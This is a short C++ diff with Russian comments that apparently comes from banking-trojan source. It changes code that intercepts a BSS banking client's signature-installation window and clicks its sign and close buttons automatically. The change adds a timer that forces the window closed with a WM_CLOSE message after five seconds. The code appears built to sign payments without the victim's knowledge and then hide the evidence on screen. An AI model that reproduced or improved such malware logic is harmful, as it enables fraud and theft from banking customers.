@@ -474,6 +474,7 @@ protected:
 	int      FWindowsCount;
 	bool     FWaitWindow;
 	TBotList FButtons;
+	DWORD    FClosebtnClickStart;
 
 	// Кликаем по кнопкам установки подписи
 	bool Click()
@@ -543,6 +544,7 @@ public:
 		// Определяем списко кнопок по которым необходимо кликнуть
 		FClickedCount = 0;
 		FWaitWindow   = false;
+		FClosebtnClickStart = 0;
         BSSSearchButtons(Wnd, false, BSS_SIGN_BUTTON_CAPTION_HASH, &FButtons);
 
 		BDBG("bsssign","Перехвачено окно установки подписей. Подписей %d", FButtons.Count());
@@ -559,11 +561,27 @@ public:
 		// нём не нажималась кнопка закрыть кликаем по ней
 		if (FStatus == bfsWait && !FCloseBtnClicked)
 		{
-            FCloseBtnClicked = true;
+
 			if (Owner()->Count() == 1 && (BOOL)pIsWindowVisible(FForm))
 			{
-				BSSSIGNLOG(FForm, false, "Кликаем по кнопке закрытия");
-				BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
+				//FCloseBtnClicked = true;
+				if (!FClosebtnClickStart)
+					FClosebtnClickStart = (DWORD)pGetTickCount();
+				bool SendCloseMsg = ((DWORD)pGetTickCount() - FClosebtnClickStart) > 5000;
+
+				// Будем кликать по кнопке закрытия до коликов в ж....
+				// Если колики наступили а коно ещё открыто то отправляем
+				// ему сообщение WM_CLOSE
+
+				if (SendCloseMsg)
+				{
+                	pPostMessageA(FForm, WM_CLOSE, (WPARAM)0, (LPARAM)0);
+				}
+				else
+				{
+					BSSSIGNLOG(FForm, false, "Кликаем по кнопке закрытия");
+					BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
+				}
 			}
 
 			return bfsWait;
